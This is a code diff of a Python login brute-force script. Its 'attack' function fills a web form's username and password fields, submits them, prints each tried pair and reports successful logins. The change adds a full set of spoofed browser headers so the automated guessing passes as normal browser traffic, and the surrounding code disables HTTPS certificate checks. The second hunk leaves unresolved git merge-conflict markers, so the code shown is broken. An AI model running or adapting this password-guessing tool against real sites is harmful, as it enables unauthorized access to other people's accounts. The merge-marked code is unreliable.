@@ -52,8 +52,16 @@ def attack(content):
         # Handle target environment that doesn't support HTTPS verification
         ssl._create_default_https_context = _create_unverified_https_context
     url = content['url']
-    user_agent = [('User-Agent', get_random_user_agent().encode().decode('utf-8'))]
-    br.addheaders=user_agent
+    headers = [('User-Agent', get_random_user_agent().encode().decode('utf-8')),
+               ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+                    ('Accept-Language', 'en-gb,en;q=0.5'),
+                    ('Accept-Encoding', 'gzip,deflate'),
+                    ('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'),
+                    ('Keep-Alive', '115'),
+                    ('Connection', 'keep-alive'),
+                    ('Cache-Control', 'max-age=0'),
+                    ('Referer', url)]
+    br.addheaders=headers
 
     print('trying' +' username:' + user+' password:'+pwd)
 
@@ -64,6 +72,10 @@ def attack(content):
     br[content['user_param']] = content['username']
     br[content['password_param']] = content['password']
     res = br.submit()
+<<<<<<< HEAD
+=======
+
+>>>>>>> 701fbfd6fd47d8e4c58ddfebeb45ae81968180f2
     if check_login(res, content['password_param'], content['user_param']):
 
         print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
